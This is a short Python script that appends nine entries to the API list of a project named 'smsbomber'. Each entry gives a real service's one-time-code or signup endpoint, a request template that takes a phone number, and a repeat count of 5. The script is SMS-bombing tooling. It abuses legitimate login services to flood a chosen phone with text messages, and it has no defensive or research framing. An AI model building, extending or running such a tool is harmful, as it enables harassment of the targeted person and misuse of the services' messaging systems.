
import os

target_file = 'e:/smsbomber/api/api_config.py'

with open(target_file, 'r', encoding='utf-8') as f:
    content = f.read()

# Find the last ']' to insert before it
insert_pos = content.rfind(']')

new_apis_str = """,
{
    "url": "https://janebi.com/signin?do",
    "method": "POST",
    "headers": {"Content-Type": "application/x-www-form-urlencoded"},
    "data": lambda phone: f'resend=0{phone}',
    "count": 5
},
{
    "url": "https://igame.ir/api/play/otp/send",
    "method": "POST",
    "headers": {"Content-Type": "application/json"},
    "data": lambda phone: json.dumps({'phone': '0' + phone}),
    "count": 5
},
{
    "url": "https://chechilas.com/user/login",
    "method": "POST",
    "headers": {"Content-Type": "application/x-www-form-urlencoded"},
    "data": lambda phone: f'mob=0{phone}',
    "count": 5
},
{
    "url": "https://api.elinorboutique.com/v1/customer/register-login",
    "method": "POST",
    "headers": {"Content-Type": "application/json"},
    "data": lambda phone: json.dumps({'mobile': '0' + phone}),
    "count": 5
},
{
    "url": "https://ubike.ir/index.php?route=extension/module/websky_otp/send_code",
    "method": "POST",
    "headers": {"Content-Type": "application/x-www-form-urlencoded"},
    "data": lambda phone: f'telephone=0{phone}',
    "count": 5
},
{
    "url": "https://app.snapp.taxi/api/api-passenger-oauth/v2/otp",
    "method": "POST",
    "headers": {"Content-Type": "application/json"},
    "data": lambda phone: json.dumps({'cellphone': '0' + phone}),
    "count": 5
},
{
    "url": "https://api.digighate.com/v2/public/code?phone={phone}",
    "method": "GET",
    "headers": {},
    "data": None,
    "count": 5
},
{
    "url": "https://www.kanoonbook.ir/store/customer_otp",
    "method": "POST",
    "headers": {"Content-Type": "application/x-www-form-urlencoded"},
    "data": lambda phone: f'customer_username={phone}&task=customer_phone',
    "count": 5
},
{
    "url": "https://sso-service.ketab.ir/api/v2/signup/otp?Mobile=0{phone}&OtpSmsType=1",
    "method": "GET",
    "headers": {},
    "data": None,
    "count": 5
}
"""

updated_content = content[:insert_pos] + new_apis_str + content[insert_pos:]

with open(target_file, 'w', encoding='utf-8') as f:
    f.write(updated_content)
